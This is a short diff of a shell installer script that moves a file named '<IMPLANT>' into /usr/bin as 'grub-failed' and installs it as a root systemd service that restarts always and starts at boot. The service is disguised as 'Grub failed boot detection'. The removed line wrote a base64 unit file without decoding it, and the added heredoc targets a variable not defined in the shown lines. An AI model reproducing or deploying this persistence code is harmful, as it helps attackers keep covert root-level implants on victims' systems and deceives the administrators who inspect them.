@@ -68,7 +68,19 @@ if download_and_verify "$url" "$out" "$expected"; then
     if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
         echo "[i]-----| Setting up global systemd service.."
         mv "/tmp/<IMPLANT>" /usr/bin/grub-failed
-        echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUdydWIgZmFpbGVkIGJvb3QgZGV0ZWN0aW9uCkFmdGVyPW5ldHdvcmsudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1mb3JraW5nClRpbWVvdXRTdGFydFNlYz0wCkV4ZWNTdGFydD0vdXNyL2Jpbi9ncnViLWZhaWxlZApVc2VyPXJvb3QKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' > '/etc/systemd/system/grub-failed.service'
+        cat > "$service_file" <<EOF
+[Unit]
+Description=Grub failed boot detection
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/grub-failed
+Restart=always
+
+[Install]
+WantedBy=default.target
+EOF
 
         systemctl daemon-reload 2>/dev/null
         systemctl enable "grub-failed" 2>/dev/null
